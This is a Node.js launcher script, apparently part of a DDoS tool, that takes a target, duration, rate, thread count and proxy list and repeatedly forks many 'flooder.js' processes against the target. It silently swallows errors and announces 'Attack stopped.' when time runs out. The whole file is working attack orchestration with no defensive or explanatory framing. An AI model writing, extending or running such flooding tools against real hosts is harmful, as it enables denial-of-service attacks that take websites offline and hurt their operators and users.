if (process.argv.length < 8) {
    console.log("node CFO.js [target] [duration] [rate] [threads] [delay] [proxies.txt]");
    process.exit(0);
}
const ErrorHandler = error => {
    //console.log(error);
};
process.on("uncaughtException", ErrorHandler);
process.on("unhandledRejection", ErrorHandler);
const child_process = require("child_process");
const target = process.argv[2];
const duration = process.argv[3];
const rates = process.argv[4];
const threads = process.argv[5];
const delay = process.argv[6];
const proxies = process.argv[7];
const clusterSleep = 43;
const flooderSleep = 45;
const options = [target, flooderSleep + "", rates, delay, proxies];
function asyncSleep(duration) {
    return new Promise(resolve => setTimeout(resolve, duration * 1000));
}
async function Executor() {
    while (true) {
        for (let count = 1; count <= threads; count++) {
            if (count.toString() === threads) console.log("Started " + threads + " clusters.");
            child_process.fork("flooder.js", options);
        }
        await asyncSleep(clusterSleep);
    }
}
Executor();
const HandleExit = () => {
    console.log("Attack stopped.");
    process.exit(1);
};
setTimeout(HandleExit, duration * 1000);